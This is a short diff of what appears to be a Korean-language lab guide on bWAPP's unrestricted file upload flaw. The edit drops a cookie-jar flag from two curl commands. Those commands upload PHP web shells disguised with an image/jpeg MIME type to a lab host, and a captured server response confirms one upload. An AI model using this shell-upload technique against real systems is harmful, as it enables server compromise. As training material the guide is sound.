@@ -185,7 +185,6 @@ EOF
 # shell.php 업로드 (MIME Type을 image/jpeg로 위장)
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      -X POST "http://192.168.0.20/bWAPP/unrestricted_file_upload.php" \
      -F "file=@/home/kali/docker_exam/shell.php;type=image/jpeg" \
      -F "form=upload" | grep -i "uploaded\|href"
@@ -200,7 +199,6 @@ The image has been uploaded <a href="images/shell.php" target="_blank">here</a>.
 # shell2.php 업로드
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      -X POST "http://192.168.0.20/bWAPP/unrestricted_file_upload.php" \
      -F "file=@/home/kali/docker_exam/shell2.php;type=image/jpeg" \
      -F "form=upload" | grep -o 'images/[^"]*'
